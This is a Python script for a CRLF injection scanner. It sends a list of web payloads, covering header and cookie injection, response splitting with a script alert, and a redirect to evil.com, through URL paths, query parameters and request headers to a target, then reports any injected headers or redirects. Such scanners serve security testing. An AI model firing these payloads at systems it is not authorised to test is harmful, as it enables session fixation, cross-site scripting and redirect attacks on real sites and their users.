#!/usr/bin/env python3
"""CRLF Injection Scanner
Tests for Carriage Return Line Feed injection vulnerabilities.
Can detect response splitting, header injection, session fixation via CRLF.
"""

import argparse
import json
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings()

# CRLF payloads
CRLF_PAYLOADS = [
    ("%0d%0a", "Basic CRLF"),
    ("%0D%0A", "Uppercase CRLF"),
    ("%5cr%5cn", "Backslash escaped"),
    ("%E5%98%8D%E5%98%8A", "UTF-8 encoded CRLF"),
    ("%0d%0a%0d%0a", "Double CRLF (body injection)"),
    ("%0d%0aX-Injected:true", "Header injection test"),
    ("%0d%0aSet-Cookie:crlf=injected", "Cookie injection test"),
    ("%0d%0a%0d%0a<script>alert(1)</script>", "XSS via CRLF"),
    ("%0d%0aLocation:https://evil.com", "Open redirect via CRLF"),
    ("\r\n", "Raw CRLF"),
    ("\r\nX-Injected:true", "Raw header injection"),
    ("%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>", "Response splitting"),
    ("%E2%80%A8%E2%80%A9", "Unicode line/paragraph separator"),
    ("%0d%0a%20X-Injected:true", "Space-prefixed header"),
    ("%0d%0a\tX-Injected:true", "Tab-prefixed header"),
    ("\\r\\n", "Literal escape sequence"),
]

# Header injection payloads for specific headers
HEADER_PAYLOADS = [
    ("Host", "%0d%0aX-Injected:true"),
    ("Referer", "%0d%0aX-Injected:true"),
    ("User-Agent", "%0d%0aX-Injected:true"),
    ("X-Forwarded-For", "%0d%0aX-Injected:true"),
    ("Cookie", "%0d%0aX-Injected:true"),
]


def test_crlf_url(url, timeout=10):
    """Test CRLF injection via URL path and query parameters."""
    findings = []
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    # Get baseline
    try:
        baseline = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
        baseline_headers = dict(baseline.headers)
        baseline_status = baseline.status_code
    except Exception as e:
        print(f"\033[91m[-]\033[0m Cannot connect: {e}")
        return []
    
    parsed = urllib.parse.urlparse(url)
    
    for payload, desc in CRLF_PAYLOADS:
        # Test in path
        test_path = parsed.path + payload if parsed.path else "/" + payload
        test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
        if parsed.query:
            test_url += f"?{parsed.query}"
        
        try:
            r = requests.get(test_url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
            
            # Check for injected headers
            for h in r.headers:
                if h.lower() == "x-injected":
                    findings.append({
                        "type": "header_injection",
                        "location": "url_path",
                        "payload": payload,
                        "desc": desc,
                        "evidence": f"X-Injected header found: {r.headers[h]}",
                        "severity": "HIGH"
                    })
            
            # Check for injected cookies
            for c in r.cookies:
                if c.name == "crlf":
                    findings.append({
                        "type": "cookie_injection",
                        "location": "url_path",
                        "payload": payload,
                        "desc": desc,
                        "evidence": f"Cookie injected: {c.name}={c.value}",
                        "severity": "HIGH"
                    })
            
            # Check for redirect injection
            if "location" in r.headers:
                loc = r.headers["location"]
                if "evil.com" in loc or "injected" in loc.lower():
                    findings.append({
                        "type": "redirect_injection",
                        "location": "url_path",
                        "payload": payload,
                        "desc": desc,
                        "evidence": f"Redirect to: {loc}",
                        "severity": "CRITICAL"
                    })
            
            # Check status code change (redirect without proper Location)
            if r.status_code in [301, 302, 303, 307, 308] and baseline_status not in [301, 302, 303, 307, 308]:
                findings.append({
                    "type": "redirect_injection",
                    "location": "url_path",
                    "payload": payload,
                    "desc": desc,
                    "evidence": f"Status changed to {r.status_code}",
                    "severity": "HIGH"
                })
            
            # Check if CRLF appears reflected in response body
            if "X-Injected" in r.text or "crlf=injected" in r.text:
                findings.append({
                    "type": "body_reflection",
                    "location": "url_path",
                    "payload": payload,
                    "desc": desc,
                    "evidence": "Injected content found in response body",
                    "severity": "MEDIUM"
                })
                
        except:
            continue
        
        # Test in query parameter
        if "?" in url:
            for param_pair in parsed.query.split("&"):
                param_name = param_pair.split("=")[0]
                test_qs = parsed.query.replace(param_pair, f"{param_name}={urllib.parse.quote(payload)}")
                test_url2 = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_qs}"
                try:
                    r2 = requests.get(test_url2, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
                    for h in r2.headers:
                        if h.lower() == "x-injected":
                            findings.append({
                                "type": "header_injection",
                                "location": f"query_param:{param_name}",
                                "payload": payload,
                                "desc": desc,
                                "evidence": f"X-Injected header via {param_name} param",
                                "severity": "HIGH"
                            })
                except:
                    continue
    
    return findings


def test_crlf_headers(url, timeout=10):
    """Test CRLF injection via HTTP headers."""
    findings = []
    base_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    for header_name, payload in HEADER_PAYLOADS:
        test_headers = base_headers.copy()
        test_headers[header_name] = payload
        
        try:
            r = requests.get(url, headers=test_headers, timeout=timeout, verify=False, allow_redirects=False)
            
            for h in r.headers:
                if h.lower() == "x-injected":
                    findings.append({
                        "type": "header_injection",
                        "location": f"header:{header_name}",
                        "payload": payload,
                        "desc": f"Via {header_name} header",
                        "evidence": f"X-Injected header found",
                        "severity": "HIGH"
                    })
        except:
            continue
    
    return findings


def main():
    parser = argparse.ArgumentParser(description="CRLF Injection Scanner")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--headers", action="store_true", help="Also test header injection")
    parser.add_argument("--json", action="store_true", help="JSON output")
    args = parser.parse_args()
    
    url = args.url.rstrip("/")
    if not url.startswith("http"):
        url = "https://" + url
    
    print(f"\033[95m[+]\033[0m CRLF Injection Scan — {url}")
    print("=" * 60)
    
    # URL-based CRLF
    print(f"\n\033[94m[*]\033[0m Testing URL-based CRLF ({len(CRLF_PAYLOADS)} payloads)...")
    url_findings = test_crlf_url(url, args.timeout)
    
    # Header-based CRLF
    header_findings = []
    if args.headers:
        print(f"\033[94m[*]\033[0m Testing header-based CRLF ({len(HEADER_PAYLOADS)} headers)...")
        header_findings = test_crlf_headers(url, args.timeout)
    
    all_findings = url_findings + header_findings
    
    if not all_findings:
        print(f"\n\033[92m[✓]\033[0m No CRLF injection vulnerabilities found")
    else:
        print(f"\n\033[91m[!] Found {len(all_findings)} CRLF injection points:\033[0m\n")
        for f in all_findings:
            sev = f["severity"]
            color = "\033[91m" if sev == "CRITICAL" else "\033[93m" if sev == "HIGH" else "\033[94m"
            print(f"  {color}[{sev}]\033[0m {f['type']}")
            print(f"    Location: {f['location']}")
            print(f"    Payload: {f['payload']}")
            print(f"    Evidence: {f['evidence']}")
            print()
    
    if args.json or True:
        out = {"url": url, "findings": all_findings, "total": len(all_findings)}
        with open("output/crlf_scan.json", "w") as f:
            json.dump(out, f, indent=2)
        print(f"[*] Results saved to output/crlf_scan.json")


if __name__ == "__main__":
    main()
